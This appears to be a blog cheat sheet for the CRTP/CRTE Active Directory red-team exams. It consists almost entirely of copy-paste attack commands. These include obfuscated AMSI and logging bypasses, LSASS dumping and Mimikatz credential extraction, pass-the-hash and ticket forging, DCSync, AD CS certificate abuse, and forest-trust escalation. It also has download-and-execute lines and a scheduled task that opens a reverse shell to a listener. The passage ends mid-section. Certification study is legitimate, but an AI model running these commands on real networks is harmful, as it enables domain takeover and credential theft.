---
title: "5 - Cheat Sheet"
classes: wide
header:  
  teaser: /assets/images/posts/crte/crte-teaser6.jpg
  overlay_image: /assets/images/main/header4.jpg
  overlay_filter: 0.5
ribbon: Firebrick
excerpt: "Cheat Sheet for CRTP/CRTE exams"
description: "Cheat Sheet for CRTP/CRTE exams"
categories:
  - notes
  - crte
tags:
  - intermediate
  - AD
  - Windows 
  - cheatsheet
toc: false
---

# Cheat Sheet

As we know, these exams are time-based. So, I created this cheat sheet to make sure the syntax of the commands are correct and consequently I dont lose any time with BS.

> The important part is to understand the content; the cheat sheet is just an **auxiliary tool** in the process.

- There is no hashes or informations of the exams here!

> Copy Button added - tell me what u think

<style>
  /* Style for the chapter container */
  .chapters {
    margin: 10px;
    padding: 10px;
    border: 1px solid #333;
    border-radius: 15px; 
    font-family: 'Arial', sans-serif;
    background-color: #1a1a1a;
    color: #ddd;
    width: calc(100% - 40px);
  }

  /* Style for the details summary */
  details summary {
    cursor: pointer;
    font-weight: bold;
    background-color: #333;
    padding: 12px;
    border: 1px solid #222;
    border-radius: 8px; 
    margin-bottom: 10px;
  }

  /* Style for the details content */
  details .content {
    margin: 20px 0;
    padding: 20px;
    border: 1px solid #222;
    border-radius: 8px; 
    background-color: #090a08;
  }

  
</style>



<div class="chapters">
  <details>
    <summary>Bypass</summary>    
    <div class="content" markdown="1">
 

**AMSI bypass**:
```powershell
Set-Item ('Va'+'rI'+'a'+'blE:1'+'q2'+'uZx') ([TYpE]("F"+'rE')) 
(Get-variable (('1Q'+'2U') +'zX'))."A`ss`Embly"."GET`TY`Pe"(('Uti'+'l','A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em'))).g`etf`iElD"(('a'+'msi'),'d',('I'+'nitF'+'aile'))).(sE`T`VaLUE)(${n`ULl},${t`RuE})
```

**Script Block logging bypass**:
```powershell
[Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der'))."gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'twProvid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)
```

**.NET AMSI bypass**:
```powershell
$ZQCUW = @"
using System;
using System.Runtime.InteropServices;
public class ZQCUW {
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string
procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr
dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $ZQCUW
$BBWHVWQ =
[ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115;&#105;&#46;&#100;&#108;&#108;'))")
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ,
"$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
$p = 0
[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)
$TLML = "0xB8"
$PURX = "0x57"
$YNWL = "0x00"
$RTGX = "0x07"
$XVON = "0x80"
$WRUD = "0xC3"
$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
```

  </div>
  </details>

  <details>
    <summary>Enumeration</summary>    
    <div class="content" markdown="1">
 


**AD Module**:
Import:
```powershell
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
```

```powershell
Get-ADUser -Filter * | Select -ExpandProperty samaccountname
Get-ADComputer –Filter * | select –expand name
Get-ADGroup -Identity 'Domain Admins' -Properties *
Get-ADGroup -Identity machineadmins -Properties Description
Get-ADGroupMember -Identity 'Domain Admins'
Get-ADGroupMember -Identity 'Enterprise Admins'
Get-ADGroupMember -Identity 'Enterprise Admins' -Server domain.local
Get-ADOrganizationalUnit -Identity 'OU=StudentsMachines,DC=us,DC=domain,DC=local' | %{Get-ADComputer -SearchBase $_ -Filter *} | select name
Get-ACL 'AD:\CN=Domain Admins,CN=Users,DC=us,DC=domain,DC=local' | select -ExpandProperty Access
(Get-ADForest).Domains
Get-ADTrust -Filter *
Get-ADTrust -Filter 'intraForest -ne $True' -Server (Get-ADForest).Name
(Get-ADForest).Domains | %{Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)' -Server $_}
Get-ADTrust -Filter * -Server domain.local
```

**Powerview**:
Import
```powershell
. C:\AD\Tools\PowerView.ps1
```

```powershell
(Get-DomainPolicy).KerberosPolicy
Get-DomainGPOLocalGroup
Get-DomainGroupMember -Identity <group>
Get-DomainOU
(Get-DomainOU -Identity <OU>).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
Get-DomainGPO
(Get-DomainOU -Identity <OU>).gplink
Get-DomainGPO -Identity '{<result of .gplink>}'
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "<user>"}
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "<group>"}
Get-ForestDomain -Verbose | Get-DomainTrust | ?{$_.TrustAttributes -eq 'FILTER_SIDS'}
Get-ForestTrust -Forest <forest>
```

  </div>
  </details>

  <details>
    <summary>Powershell Stager</summary>
    <div class="content" markdown="1">
 


```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\PowerUp.ps1
Invoke-AllChecks
Invoke-ServiceAbuse -Name ALG -UserName domain\studentuserx -Verbose
```

**Same attack with accesschk64 from SysInternals**:
```powershell
.\accesschk64.exe -uwcqv 'user' *

sc.exe config ALG binPath= "net localgroup administrators domain\user
/add"
sc.exe stop ALG
sc.exe start ALG
sc.exe config ALG binPath= "C:\WINDOWS\System32\alg.exe"
sc.exe stop ALG
sc.exe start ALG
```

**Look for local administrative access w/ Powerview**:
```powershell
Find-LocalAdminAccess -Verbose
Find-WMILocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess.ps1
```

**Recursively look for group membership**:
```powershell
function Get-ADPrincipalGroupMembershipRecursive ($SamAccountName) {
  $groups = @(Get-ADPrincipalGroupMembership -Identity $SamAccountName | select -ExpandProperty distinguishedname) 
  $groups
  if ($groups.count -gt 0) {
    foreach ($group in $groups) {
      Get-ADPrincipalGroupMembershipRecursive $group
    }
  }
}
```

> ACL entries

**Check if any of the groups has interesting ACL entries**:
```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'managers'}
Get-DomainObjectAcl -Identity machineadmins -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match 'managers'}
```

  </div>
  </details>

  <details>
    <summary>LAPS</summary>
    <div class="content" markdown="1">

```powershell
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
Import-Module C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1 -Verbose
C:\AD\Tools\Get-LapsPermissions.ps1
```

With Powerview:
```powershell
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier); $_}
```

**Read the password**:
```powershell
Get-ADComputer -Identity <computer> -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd
Get-AdmPwdPassword -ComputerName <computer>
Get-DomainObject -Identity <computer> | select -ExpandProperty ms-mcs-admpwd
```

**Access the machine with the password**:
```powershell
winrs -r:<computer> -u:.\administrator -p:<passwd> cmd
$passwd = ConvertTo-SecureString '<password>' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("<computer>\administrator", $passwd)
$mailmgmt = New-PSSession -ComputerName <computer> -Credential $creds
$mailmgmt
```

  </div>
  </details>

  <details>
    <summary>Extract Credentials</summary>
    <div class="content" markdown="1">
 


winrs:
```powershell
winrs net use x: \\<computer>\C$\Users\Public /user:<computer>\Administrator <password>
echo F | xcopy C:\AD\Tools\Loader.exe x:\Loader.exe
net use x: /d
```

**Bypass behaviour detection**:
```powershell
winrs -r:<computer> -u:.\administrator -p:<password> cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.X
```

**Extract**:
```powershell
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
sekurlsa::keys
```

**Microsoft signed binary to download NetLoader**:
```powershell
winrs -r:<computer> -u:.\administrator -p:<password>
"bitsadmin /transfer WindowsUpdates /priority normal http://127.0.0.1:8080/Loader.exe C:\\Users\\Public\\Loader.exe"
```

**PowerShell Remoting and Invoke-Mimi**:
```powershell
$passwd = ConvertTo-SecureString '<password>' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("<computer>\administrator", $passwd)
$mailmgmt = New-PSSession -ComputerName <computer> -Credential $creds
Enter-PSSession $mailmgmt
```

**Bypass AMSI before proceeding**!
```powershell
Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimi.ps1 -Session $mailmgmt
Enter-PSSession $mailmgmt
Invoke-Mimi -Command '"sekurlsa::keys"'
```

  </div>
  </details>

  <details>
    <summary>gMSA</summary>
    <div class="content" markdown="1">
 


```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
Get-ADServiceAccount -Filter *
Get-ADServiceAccount -Identity jumpone -Properties * | select PrincipalsAllowedToRetrieveManagedPassword
```

> You have to open a shell with the user that has permission to read gMSA, after that

```powershell
Import AD Module again, then:
$Passwordblob = (Get-ADServiceAccount -Identity jumpone -Properties msDS-ManagedPassword).'msDS-ManagedPassword'
To decode the password we can use DSinternals:
Import-Module C:\AD\Tools\DSInternals_v4.7\DSInternals\DSInternals.psd1
$decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob
ConvertTo-NTHash –Password $decodedpwd.SecureCurrentPassword
```

> After that, you can PTH to see if the user has access to another machine!

  </div>
  </details>

  <details>
    <summary>PTH</summary>
    <div class="content" markdown="1">

**From an elevated shell**:
```powershell
C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:<user> /domain:<domain> /aes256:<password> /run:cmd.exe" "exit"
```

**using NTLM**:
```powershell
C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:<user> /domain:<domain>  /ntlm:<password> /run:cmd.exe" "exit"

C:\AD\Tools\Rubeus.exe s4u /user:<user> /aes256:<password> /impersonateuser:administrator /msdsspn:CIFS/<machine.domain> /altservice:HTTP /domain:<domain> /ptt
```

**Doesn't need elevation**:
```powershell
C:\AD\Tools\Rubeus.exe asktgt /domain:<domain> /user:<user> /aes256:<password> opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

  </div>
  </details>

  <details>
    <summary>Application Whitelisting</summary>
    <div class="content" markdown="1">

> CLM, AppLocker, WDAC

**Verify if PowerShell is running in Constrained Language Mode**:
```powershell
$ExecutionContext.SessionState.LanguageMode
```

**Check for AppLocker** (if there is an error, the AppLocker is not in use):
```powershell
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
Get-AppLockerPolicy –Effective
```

**Verify WDAC**:
```powershell
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
CodeIntegrityPolicyEnforcementStatus : 2
UsermodeCodeIntegrityPolicyEnforcementStatus : 2
```

Check out [Lolbas Project on Github](https://lolbas-project.github.io/)

> Lets DUMP lsass*

**Get the PID of lsass.exe process**:
```powershell
tasklist /FI "IMAGENAME eq lsass.exe"
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 708 C:\Users\Public\lsass.dmp full
```

**Copy the `lsass` to your machine**:
```powershell
echo F | xcopy \\us-jump\C$\Users\Public\lsass.dmp C:\AD\Tools\lsass.dmp
```

**Run Mimikatz with Admin Priv, then**:
```powershell
sekurlsa::minidump C:\AD\Tools\lsass.DMP
privilege::debug
sekurlsa::keys
```

**Check for Certificates**:
```powershell
echo F | xcopy C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat \\us-jump\C$\Users\Public\RunWithRegistryNonAdmin.bat /Y
echo F | xcopy C:\AD\Tools\InviShell\InShellProf.dll \\us-jump\C$\Users\Public\InShellProf.dll /Y
```

```powershell
winrs -r:us-jump cmd
C:\Users\Public\RunWithRegistryNonAdmin.bat
ls cert:\LocalMachine\My
ls cert:\LocalMachine\My\BAD78F43BB4CB13C4843E49B51AA051530FFBBDB | Export-PfxCertificate -FilePath C:\Users\Public\user.pfx -Password (ConvertTo-SecureString -String 'SecretPass@123' -Force -AsPlainText)
```

**Copy the certificate**:
```
echo F | xcopy \\us-jump\C$\Users\Public\user.pfx C:\AD\Tools\user.pfx
```

  
  </div>
  </details>
  
  <details>
    <summary>Unconstrained delegation</summary>
    <div class="content" markdown="1">
 


```powershell
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
```

**Access the machine with unconstrained deleg, then**:
```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
cd C:\AD\Tools\
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess -Verbose
```

**Copy Rubeus using xcopy and execute using winrs**:
```powershell
echo F | xcopy C:\AD\Tools\Rubeus.exe \\us-web\C$\Users\Public\Rubeus.exe /Y
winrs -r:us-web cmd.exe
C:\Users\Public\Rubeus.exe monitor /targetuser:DC$ /interval:5 /nowrap
```

**Copy and execute Rubeus using PowerShell Remoting**:
```powershell
$usweb1 = New-PSSession us-web
Copy-Item -ToSession $usweb1 -Path C:\AD\Tools\Rubeus.exe -Destination C:\Users\Public
Enter-PSSession $usweb1
cd C:\Users\Public .\Rubeus.exe monitor /targetuser:DC$ /interval:5 /nowrap
```

**Abuse the printer bug**:
```powershell
C:\AD\Tools\MS-RPRN.exe \\dc.domain.local \\us-web.domain.local
```

**Copy the Base64EncodedTicket, then**:
```powershell
C:\AD\Tools\Rubeus.exe ptt /ticket:TGTofDC$
```

**Run DCSync attack**:
```powershell
C:\AD\Tools\SharpKatz.exe --Command dcsync --User domain\krbtgt --Domain domain.local --DomainController dc.domain.local
```

**To get EA access**

it's the same:

1. Monitor the DC of the root of the forest
2. Execute MS-RPRN with the DC target
3. Copy the Base64 and PTT
4. DCSync EA (Administrator of the root forest)

```powershell
C:\AD\Tools\SharpKatz.exe --Command dcsync --User domain\administrator --Domain domain.local --DomainController domain-dc.domain.local
```

**In a different forest**

> If TGT Delegation is enabled across forests trusts, we can abuse the printer bug across two-way forest trusts as well.

1. ASKTGT
2. Send Rubeus to the target machine
3. Access the machine with WINRS
4. Execute Rubeus monitor (with the Target Forest)
5. Execute MS-RPRN (with the Target Forest)
6. Copy base64 & PTT with Rubeus

**Now we can run DCSync to the Targeted Forest**:
```powershell
C:\AD\Tools\SharpKatz.exe --Command dcsync --User usvendor\krbtgt --Domain usvendor.local --DomainController usvendor-dc.usvendor.local
```

  </div>
  </details>

  <details>
    <summary>Constrained delegation</summary>
    <div class="content" markdown="1">
 


```powershell
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

**Collect the service from msDS-AllowedToDelegateTo and access with Rubeus S4U**:
```powershell
klist
winrs -r:us-mssql.domain.local cmd.exe
```

**To execute on another Forest just add the flag -Server**:
```powershell
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo -Server domain.local
```

**We need access to the machine that has Constrained Deleg enabled**:
```powershell
C:\AD\Tools\Rubeus.exe hash /password:Qwerty@123 /user:<user> /domain:domain.local
C:\AD\Tools\Rubeus.exe s4u /user:<user> /rc4:<hash> /impersonateuser:Administrator /domain:domain.local /msdsspn:nmagent/dc.domain.local /altservice:ldap /dc:dc.domain.local /ptt
```

**With the LDAP service ticket, We can DCSync**:
```powershell
C:\AD\Tools\SharpKatz.exe --Command dcsync --User domain\krbtgt --Domain domain.local --DomainController dc.domain.local
C:\AD\Tools\SharpKatz.exe --Command dcsync --User domain\administrator --Domain domain.local --DomainController dc.domain.local
```


  </div>
  </details>

  <details>
    <summary>ACLs Write Permissions</summary>
    <div class="content" markdown="1">

**If you have Write permission**:
```powershell
echo F | xcopy C:\AD\Tools\Loader.exe \\us-mgmt\C$\Users\Public\Loader.exe /Y
winrs -r:us-mgmt cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.x
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
sekurlsa::keys
```

**If you get any user, run the full enumeration on that user**:
```powershell
C:\AD\Tools\PowerView.ps1
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'mgmtadmin'}
```

**With GenericWrite we can set Resource-based Constrained Delegation (RBCD)**:
```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
$comps = 'user1$','user2$'
Set-ADComputer -Identity us-helpdesk -PrincipalsAllowedToDelegateToAccount $comps -Verbose
```

**Extract AES of your machine**:
```powershell
C:\AD\Tools\SafetyKatz.exe -Command "sekurlsa::keys" "exit"
```

**Go for the one with SID S-1-5-18 that is a well-known SID for the SYSTEM user**:
```powershell
C:\AD\Tools\Rubeus.exe s4u /user:machine$ /aes256:$password /msdsspn:http/us-helpdesk /impersonateuser:administrator /ptt
klist
winrs -r:us-helpdesk cmd
```

**To copy our loader to the machine, we need to access the filesystem. So, request a TGS for CIFS using Rubeus**:
```powershell
C:\AD\Tools\Rubeus.exe s4u /user:machine$ /aes256:$password /msdsspn:cifs/us-helpdesk /impersonateuser:administrator /ptt
echo F | xcopy C:\AD\Tools\Loader.exe \\us-helpdesk\C$\Users\Public\Loader.exe /Y
winrs -r:us-helpdesk cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.x
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
```

> If any new users are found, *PTH and Find-PSRemotingLocalAdminAccess -Verbose*



  </div>
  </details>

  <details>
    <summary>Tickets</summary>
    <div class="content" markdown="1">
 


**GOLDEN**

**Without using Invoke-Mimi.ps1**:
```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:<domain> /sid:<SID> /aes256:<hash> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
klist
echo F | xcopy C:\AD\Tools\Loader.exe \\dc\C$\Users\Public\Loader.exe /Y
winrs -r:dc cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.x
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
```

**Using Invoke-Mimi.ps1 and PowerShell Remoting**:
```powershell
. C:\AD\Tools\Invoke-Mimi.ps1
Invoke-Mimi -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<SID> /aes256:<hash> /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
$sess = New-PSSession <machine name>
Enter-PSSession -Session $sess

# bypass AMSI 

exit
Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimi.ps1 -Session $sess
Enter-PSSession -Session $sess
Invoke-Mimi -Command '"lsadump::lsa /patch"'
```

**SILVER**

```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:<domain> /sid:<SID> /target:<target> /service:HOST /aes256:<hash> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
klist
```

**Start a listening in another prompt**:
```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\powercat.ps1
powercat -l -v -p 443 -t 1000
schtasks /create /S <target machine> /SC Weekly /RU "NT Authority\SYSTEM" /TN "Userx" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.100.x/Invoke-PowerShellTcpEx.ps1''')'"
schtasks /Run /S <target machine> /TN "Userx"
```

We should get a shell on the listener prompt. 

> For *WMI*, we need 2 tickets – *HOST and RPCSS*

```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:<domain> /sid:<SID> /target:<target dc> /service:HOST /aes256:<hash> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:<domain> /sid:<SID> /target:<target dc> /service:RPCSS /aes256:<hash> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
Get-WmiObject -Class win32_operatingsystem -ComputerName <computer name>
```

  </div>
  </details>

  <details>
    <summary>DCSync</summary>
    <div class="content" markdown="1">
 


```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\PowerView.ps1
```

**Check if the user has Replication Rights**:
```powershell
Get-DomainObjectAcl -SearchBase "dc=us,dc=domain,dc=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentuserx"}
```

**With DA privileges We can add those rights**:
```powershell
C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:administrator /domain:domain.local /aes256:<hash> /run:cmd.exe" "exit"
```

**Using Powerview**:
```powershell
Add-DomainObjectAcl -TargetIdentity "dc=us,dc=domain,dc=local" -PrincipalIdentity studentuserx -Rights DCSync -PrincipalDomain domain.local -TargetDomain domain.local -Verbose
```

**Using AD Module with Set-ADACL from RACE**:
```powershell
Set-ADACL -DistinguishedName 'DC=us,DC=domain,DC=local' -SamAccountName studentuserx -GUIDRight DCSync -Verbose
```

> From a normal shell, check the rights again

**Now we can execute DCSync attacks**:
```powershell
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:domain\krbtgt" "exit"
Invoke-Mimi -Command '"lsadump::dcsync /user:domain\krbtgt"'
```

  </div>
  </details>

  <details>
    <summary>AD CS</summary>
    <div class="content" markdown="1">
 


```powershell
C:\AD\Tools\Certify.exe cas
C:\AD\Tools\Certify.exe find
```

**ENROLLEE_SUPPLIES_SUBJECT attribute means we can request a certificate for ANY user**:
```powershell
C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubject
C:\AD\Tools\Rubeus.exe asktgt /user:<user> /certificate:C:\AD\Tools\user.pfx /password:SecretPass@123 /nowrap /ptt
C:\AD\Tools\Certify.exe request /ca:domain-DC.domain.local\DOMAIN-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator
```

> *Copy all the text between -----BEGIN RSA PRIVATE KEY----- and -----END CERTIFICATE----- and save it to cert.pem*


C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\DA.pfx

**Finally, request a TGT for the DA**:
```powershell
C:\AD\Tools\Rubeus.exe asktgt /user:Administrator /certificate:C:\AD\Tools\DA.pfx /password:SecretPass@123 /nowrap /ptt
winrs -r:dc whoami
```

**For EA**

**Request and convert to PFX, then request the TGT**:
```powershell
C:\AD\Tools\Rubeus.exe asktgt /user:domain.local\Administrator /dc:domain-dc.domain.local /certificate:C:\AD\Tools\EA.pfx /password:SecretPass@123 /nowrap /ptt
winrs -r:domain-dc whoami
```

   </div>
  </details>

  <details>
    <summary>Azure AD Connect</summary>
    <div class="content" markdown="1">

```powershell
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Server domain.local -Properties * | select SamAccountName,Description | fl
C:\AD\Tools\Rubeus.exe asktgt /domain:domain.local /user:<user> /aes256:<hash> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
echo F | xcopy C:\AD\Tools\InviShell\InShellProf.dll \\us-adconnect\C$\Users\<user>\Downloads\InShellProf.dll /Y
echo F | xcopy C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat \\us-adconnect\C$\Users\<user>\Downloads\RunWithRegistryNonAdmin.bat /Y
winrs -r:us-adconnect cmd
cd C:\Users\<user>\Downloads
RunWithRegistryNonAdmin.bat
```

**Extract credentials of MSOL_**:
```powershell
iex (New-Object Net.WebClient).DownloadString('http://192.168.100.x/adconnect.ps1')
ADconnect
```

**Now we can run DCsync (From elevated shell)**:
```powershell
runas /user:domain.local\MSOL_16fb75d0227d /netonly cmd
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:domain\administrator /domain:domain.local" "exit"
```

**DCsync (from a normal shell)**:
```powershell
runas /user:domain.local\MSOL_16fb75d0227d /netonly cmd
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\Invoke-Mimi.ps1
Invoke-Mimi -Command '"lsadump::dcsync /user:domain\administrator /domain:domain.local"'
```


   </div>
  </details>

  <details>
    <summary>Domain Privesc (TrustKey & KRBTGT)</summary>
    <div class="content" markdown="1">
 


**Using TRUSTKEY**

**With DA - Escalate to EA or DA of the parent domain**:

```powershell
C:\AD\Tools\Rubeus.exe asktgt /user:administrator /aes256:<hash> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
echo F | xcopy C:\AD\Tools\Loader.exe \\dc\C$\Users\Public\Loader.exe /Y
winrs -r:dc cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.x
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
lsadump::trust /patch
```

> Grab the RC4 of [ In ] child domain -> parent domain**
   
**Create the inter-realm TGT using the trust key**:   
```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /domain:domain.local /sid:S-1-5-21-210670787-2521448726-163245708 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /rc4:<hash> /user:Administrator /service:krbtgt /target:domain.local /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"
```

``` powershell
C:\AD\Tools\Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_tkt.kirbi /service:CIFS/domain-dc.domain.local /dc:domain-dc.domain.local /ptt
```

``` powershell
klist
```

``` powershell
dir \\domain-dc.domain.local\c$
```
 

**Using KRBTGT Hash**

**Create inter-realm TGT with SID history for Enterprise Admins**:
```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:<hash> /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /ptt" "exit"
klist
winrs -r:domain-dc cmd
```


   </div>
  </details>

  <details>
    <summary>Abuse Trust Relationship (Forest)</summary>
    <div class="content" markdown="1">
 


```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:<domain> /sid:<SID> /aes256:<hash> /ptt"
lsadump::dcsync /user:domain\user$ /domain:domain.local
```

**Copy SafetyKatz and Rubeus**:
```powershell
echo F | xcopy C:\AD\Tools\BetterSafetyKatz.exe \\dc.domain.local\C$\Users\Public\BetterSafetyKatz.exe /Y
echo F | xcopy C:\AD\Tools\Rubeus.exe \\dc.domain.local\C$\Users\Public\Rubeus.exe /Y
```

**Forge an inter-realm TGT**:
```powershell
winrs -r:dc.domain.local cmd
C:\Users\Public\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:<domain> /sid:<SID> /rc4:<hash> /service:krbtgt /target:domain.local /sids:S-1-5-21-4066061358-3942393892-617142613-519 /ticket:C:\Users\Public\sharedwithdomain.kirbi" "exit"
C:\Users\Public\Rubeus.exe asktgs /ticket:C:\Users\Public\sharedwithdomain.kirbi /service:CIFS/dc.domain.local /dc:dc.domain.local /ptt
```

**With the CIFS service we can access the share**:
```powershell
dir \\dc.domain.local\eushare
```

> Access the target forest using PowerShell Remoting


**Check if SIDHistroy is enabled for the trust between the 2 Forests**:
```powershell
echo F | xcopy C:\AD\Tools\InviShell\InShellProf.dll \\dc.domain.local\C$\Users\Public\InShellProf.dll /Y
echo F | xcopy C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat \\dc.domain.local\C$\Users\Public\RunWithRegistryNonAdmin.bat /Y
winrs -r:dc.domain.local cmd
C:\Users\Public\RunWithRegistryNonAdmin.bat
```

**Check if there are any groups with SID>1000**:
```powershell
